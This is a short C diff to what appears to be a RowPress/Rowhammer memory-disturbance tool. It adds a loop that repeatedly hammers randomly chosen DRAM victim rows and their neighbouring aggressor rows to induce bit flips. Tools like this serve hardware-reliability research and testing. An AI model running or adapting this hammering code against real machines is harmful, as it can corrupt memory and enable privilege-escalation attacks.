@@ -92,10 +92,23 @@ void press_one(uint64_t *victims, int num_victims) {
         }
     }
 
+    uint64_t rand_victim; 
+    uint64_t* rand_attacker_1 = (uint64_t*) calloc(1, sizeof(uint64_t));
+    uint64_t* rand_attacker_2 = (uint64_t*) calloc(1, sizeof(uint64_t)); 
+
     while (true) {
         for (int i = 0; i < num_victims; i++) {
             uint32_t num_bit_flips = press(victims_virt_addr[i], attacker_1[i], attacker_2[i]);
             if (num_bit_flips > 0) break;
+
+            // press random victims
+            for (int j = 0; j < 20; j++) {
+                rand_victim = (uint64_t)((uint8_t *)allocated_mem + ROW_SIZE * (rand() % (mem_size / PAGE_SIZE)));
+                // row + 1, row - 1
+                if (get_addresses_to_hammer(virt_to_phys(rand_victim), rand_attacker_1, rand_attacker_2, 1)) {
+                    press(rand_victim, *rand_attacker_1, *rand_attacker_2);
+                }
+            }
         }
     }
 }
